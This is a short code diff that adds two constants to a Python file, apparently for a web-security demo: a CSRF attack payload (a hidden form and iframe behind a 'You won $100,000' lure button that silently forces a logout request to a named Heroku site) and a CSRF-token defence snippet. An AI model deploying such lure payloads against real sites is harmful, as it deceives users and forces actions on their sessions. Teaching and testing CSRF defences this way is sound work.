@@ -1,6 +1,11 @@
 import os
 import json
 
+CSRF_ATTACK = '<form hidden id="hack" target="csrf-frame" action="https://laryn-links.herokuapp.com/logout" method="GET" autocomplete="off"> </form> <iframe hidden name="csrf-frame"></iframe> <h3>You won $100,000</h3> <button onClick="hack();" id="button">Click to claim</button> <br> <div id="warning"></div> <script> function hack() { document.getElementById("hack").submit(); document.getElementById("warning").innerHTML="check your login status!"; } </script>'
+# CSRF_ATTACK = '<form hidden id="hack" target="csrf-frame" action="https://localhost:5000/logout" method="GET" autocomplete="off"> </form> <iframe hidden name="csrf-frame"></iframe> <h3>You won $100,000</h3> <button onClick="hack();" id="button">Click to claim</button> <br> <div id="warning"></div> <script> function hack() { document.getElementById("hack").submit(); document.getElementById("warning").innerHTML="check your login status!"; } </script>'
+
+CSRF_BLOCK = '<form method="post"> <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/> </form> <form method="get"> <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/> </form>'
+
 def gen_credentials():
 
     CRED_TYPE = os.environ.get('CRED_TYPE')
